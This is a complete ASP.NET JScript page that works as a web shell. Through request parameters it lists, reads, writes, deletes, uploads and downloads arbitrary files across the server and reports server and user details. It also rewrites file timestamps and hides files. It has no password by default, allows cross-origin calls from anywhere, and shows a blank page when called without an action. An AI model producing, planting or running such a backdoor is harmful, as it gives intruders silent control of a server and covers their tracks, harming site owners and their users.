<%@ Page Language="JScript" Debug="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%
Response.ContentType = "application/json";
Response.Charset = "utf-8";
Response.AddHeader("Access-Control-Allow-Origin", "*");
Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
Response.AddHeader("Access-Control-Allow-Headers", "Content-Type");

if (Request.HttpMethod == "OPTIONS") {
    Response.End();
}

var PASSWORD : String = "";
var password : String = Request.QueryString["password"] || Request.Form["password"] || "";
var action : String = Request.QueryString["action"] || Request.Form["action"] || "";

if (PASSWORD != "" && password != PASSWORD) {
    Response.Write("null");
    Response.End();
}

if (action == "") {
    Response.ContentType = "text/html";
    Response.End();
}

function getParam(name : String) : String {
    var v : String = Request.QueryString[name];
    if (v == null || v == "") v = Request.Form[name];
    return v || "";
}

function toJson(obj : Object) : String {
    var serializer : JavaScriptSerializer = new JavaScriptSerializer();
    return serializer.Serialize(obj);
}

function success(data : Object) : Object {
    var r : Object = { success: true, data: data, message: "" };
    return r;
}

function fail(msg : String) : Object {
    var r : Object = { success: false, message: msg };
    return r;
}

function formatSize(size : long) : String {
    if (size < 1024) return size + " B";
    if (size < 1048576) return (size / 1024).toFixed(1) + " KB";
    if (size < 1073741824) return (size / 1048576).toFixed(1) + " MB";
    return (size / 1073741824).toFixed(1) + " GB";
}

function toUnixTime(dt : DateTime) : long {
    var epoch : DateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
    return Math.floor((dt.ToUniversalTime().Ticks - epoch.Ticks) / 10000000);
}

function normPath(p : String) : String {
    if (p == null || p == "" || p == "/") {
        return Server.MapPath("/");
    }
    return p.replace(/\//g, "\\");
}

function getPerms(attr : int, isDir : boolean) : String {
    var p : String = isDir ? "d" : "-";
    p += "r";
    p += (attr & 1) ? "-" : "w"; // ReadOnly check
    p += isDir ? "x" : "-";
    p += "r-";
    p += isDir ? "x" : "-";
    p += "r-";
    p += isDir ? "x" : "-";
    return p;
}

try {
    if (action == "list") {
        var listPath : String = getParam("path");
        if (listPath == "" || listPath == "/") {
            listPath = Server.MapPath("/");
        }
        listPath = normPath(listPath);

        var dir : DirectoryInfo = new DirectoryInfo(listPath);
        if (dir.Exists) {
            var items : Array = [];

            // Parent directory
            if (dir.Parent != null) {
                var parentPath : String = dir.Parent.FullName;
                items.push({
                    name: "..",
                    path: parentPath,
                    is_dir: true,
                    size: 0,
                    size_formatted: "-",
                    mtime: 0,
                    perms: "drwxr-xr-x",
                    readable: true,
                    writable: true
                });
            }

            // Directories
            var dirs : DirectoryInfo[] = dir.GetDirectories();
            for (var i : int = 0; i < dirs.length; i++) {
                var d : DirectoryInfo = dirs[i];
                try {
                    items.push({
                        name: d.Name,
                        path: d.FullName,
                        is_dir: true,
                        size: 0,
                        size_formatted: "-",
                        mtime: toUnixTime(d.LastWriteTime),
                        perms: getPerms(int(d.Attributes), true),
                        readable: true,
                        writable: (int(d.Attributes) & 1) == 0
                    });
                } catch (ex : Exception) {}
            }

            // Files
            var files : FileInfo[] = dir.GetFiles();
            for (var j : int = 0; j < files.length; j++) {
                var f : FileInfo = files[j];
                try {
                    items.push({
                        name: f.Name,
                        path: f.FullName,
                        is_dir: false,
                        size: int(f.Length),
                        size_formatted: formatSize(f.Length),
                        mtime: toUnixTime(f.LastWriteTime),
                        perms: getPerms(int(f.Attributes), false),
                        readable: true,
                        writable: !f.IsReadOnly
                    });
                } catch (ex : Exception) {}
            }

            Response.Write(toJson(success({ path: listPath, items: items })));
        } else {
            Response.Write(toJson(fail("Directory not found: " + listPath)));
        }
    }
    else if (action == "read") {
        var readPath : String = normPath(getParam("path"));

        if (File.Exists(readPath)) {
            var content : String = File.ReadAllText(readPath, System.Text.Encoding.UTF8);
            Response.Write(toJson(success({ path: readPath, content: content })));
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "write") {
        var writePath : String = getParam("path");
        var writeContent : String = Request.Form["content"] || "";

        if (writePath != "") {
            var parentDir : String = Path.GetDirectoryName(writePath);
            if (parentDir != "" && !Directory.Exists(parentDir)) {
                Response.Write(toJson(fail("Parent directory doesn't exist")));
            } else {
                File.WriteAllText(writePath, writeContent, System.Text.Encoding.UTF8);
                if (File.Exists(writePath)) {
                    Response.Write(toJson({ success: true, message: "Saved to " + writePath }));
                } else {
                    Response.Write(toJson(fail("File not created")));
                }
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "mkdir") {
        var mkdirPath : String = getParam("path");

        if (mkdirPath != "") {
            if (!Directory.Exists(mkdirPath)) {
                Directory.CreateDirectory(mkdirPath);
                Response.Write(toJson({ success: true, message: "Created" }));
            } else {
                Response.Write(toJson(fail("Already exists")));
            }
        } else {
            Response.Write(toJson(fail("Path empty")));
        }
    }
    else if (action == "delete") {
        var deletePath : String = normPath(getParam("path"));

        if (Directory.Exists(deletePath)) {
            Directory.Delete(deletePath, true);
            Response.Write(toJson({ success: true, message: "Deleted" }));
        } else if (File.Exists(deletePath)) {
            File.Delete(deletePath);
            Response.Write(toJson({ success: true, message: "Deleted" }));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "rename") {
        var oldPath : String = normPath(getParam("old_path"));
        var newPath : String = getParam("new_path");

        if (Directory.Exists(oldPath)) {
            Directory.Move(oldPath, newPath);
            Response.Write(toJson({ success: true, message: "Renamed" }));
        } else if (File.Exists(oldPath)) {
            File.Move(oldPath, newPath);
            Response.Write(toJson({ success: true, message: "Renamed" }));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else if (action == "download") {
        var downloadPath : String = normPath(getParam("path"));

        if (File.Exists(downloadPath)) {
            var fileName : String = Path.GetFileName(downloadPath);
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");
            Response.TransmitFile(downloadPath);
            Response.End();
        } else {
            Response.Write(toJson(fail("File not found")));
        }
    }
    else if (action == "upload") {
        var uploadDir : String = getParam("dir");
        if (uploadDir == "") uploadDir = Server.MapPath("/");
        uploadDir = normPath(uploadDir);

        if (Request.Files.Count > 0) {
            var uploadFile : HttpPostedFile = Request.Files[0];
            var uploadFileName : String = Path.GetFileName(uploadFile.FileName);
            var uploadFilePath : String = Path.Combine(uploadDir, uploadFileName);
            uploadFile.SaveAs(uploadFilePath);
            Response.Write(toJson({ success: true, message: "Uploaded", data: { path: uploadFilePath } }));
        } else {
            Response.Write(toJson(fail("No file")));
        }
    }
    else if (action == "touch") {
        var touchPath : String = normPath(getParam("path"));
        var timeVal : String = getParam("time");
        var timestamp : long = 0;
        try { timestamp = parseInt(timeVal); } catch (e) {}

        if ((File.Exists(touchPath) || Directory.Exists(touchPath)) && timestamp > 0) {
            var epoch : DateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            var newTime : DateTime = epoch.AddSeconds(timestamp).ToLocalTime();

            if (File.Exists(touchPath)) {
                File.SetLastWriteTime(touchPath, newTime);
            } else {
                Directory.SetLastWriteTime(touchPath, newTime);
            }
            Response.Write(toJson({ success: true, message: "Updated" }));
        } else {
            Response.Write(toJson(fail("Not found or invalid time")));
        }
    }
    else if (action == "chmod") {
        var chmodPath : String = normPath(getParam("path"));
        var mode : String = getParam("mode");

        if ((File.Exists(chmodPath) || Directory.Exists(chmodPath)) && mode != "") {
            if (File.Exists(chmodPath)) {
                var fi : FileInfo = new FileInfo(chmodPath);
                if (mode == "readonly") {
                    fi.Attributes = fi.Attributes | FileAttributes.ReadOnly;
                } else if (mode == "normal") {
                    fi.Attributes = fi.Attributes & ~FileAttributes.ReadOnly;
                } else if (mode == "hidden") {
                    fi.Attributes = fi.Attributes | FileAttributes.Hidden;
                } else if (mode == "visible") {
                    fi.Attributes = fi.Attributes & ~FileAttributes.Hidden;
                }
            } else {
                var di : DirectoryInfo = new DirectoryInfo(chmodPath);
                if (mode == "readonly") {
                    di.Attributes = di.Attributes | FileAttributes.ReadOnly;
                } else if (mode == "normal") {
                    di.Attributes = di.Attributes & ~FileAttributes.ReadOnly;
                } else if (mode == "hidden") {
                    di.Attributes = di.Attributes | FileAttributes.Hidden;
                } else if (mode == "visible") {
                    di.Attributes = di.Attributes & ~FileAttributes.Hidden;
                }
            }
            Response.Write(toJson({ success: true, message: "Permission changed" }));
        } else {
            Response.Write(toJson(fail("Not found or mode empty")));
        }
    }
    else if (action == "server") {
        var currentUser : String = System.Environment.UserName || "N/A";
        var docRoot : String = Server.MapPath("/");
        var diskFree : String = "N/A";
        var diskTotal : String = "N/A";

        try {
            var drive : DriveInfo = new DriveInfo(Path.GetPathRoot(docRoot));
            diskFree = formatSize(drive.AvailableFreeSpace);
            diskTotal = formatSize(drive.TotalSize);
        } catch (ex : Exception) {}

        Response.Write(toJson(success({
            php_version: "JScript .NET " + System.Environment.Version.ToString(),
            server_software: Request.ServerVariables["SERVER_SOFTWARE"] || "IIS",
            document_root: docRoot,
            upload_max: "N/A",
            disk_free: diskFree,
            disk_total: diskTotal,
            current_user: currentUser
        })));
    }
    else if (action == "info") {
        var infoPath : String = normPath(getParam("path"));

        if (File.Exists(infoPath)) {
            var fileInfo : FileInfo = new FileInfo(infoPath);
            Response.Write(toJson(success({
                path: infoPath,
                name: fileInfo.Name,
                is_dir: false,
                size: int(fileInfo.Length),
                size_formatted: formatSize(fileInfo.Length),
                mtime: toUnixTime(fileInfo.LastWriteTime),
                ctime: toUnixTime(fileInfo.CreationTime),
                atime: toUnixTime(fileInfo.LastAccessTime),
                perms: getPerms(int(fileInfo.Attributes), false),
                perms_octal: "0644",
                owner: "N/A",
                group: "N/A",
                readable: true,
                writable: !fileInfo.IsReadOnly
            })));
        } else if (Directory.Exists(infoPath)) {
            var dirInfo : DirectoryInfo = new DirectoryInfo(infoPath);
            Response.Write(toJson(success({
                path: infoPath,
                name: dirInfo.Name,
                is_dir: true,
                size: 0,
                size_formatted: "-",
                mtime: toUnixTime(dirInfo.LastWriteTime),
                ctime: toUnixTime(dirInfo.CreationTime),
                atime: toUnixTime(dirInfo.LastAccessTime),
                perms: getPerms(int(dirInfo.Attributes), true),
                perms_octal: "0755",
                owner: "N/A",
                group: "N/A",
                readable: true,
                writable: (int(dirInfo.Attributes) & 1) == 0
            })));
        } else {
            Response.Write(toJson(fail("Not found")));
        }
    }
    else {
        Response.Write(toJson(fail("Unknown action")));
    }
} catch (e : Exception) {
    Response.Write(toJson(fail("Error: " + e.Message)));
}
%>
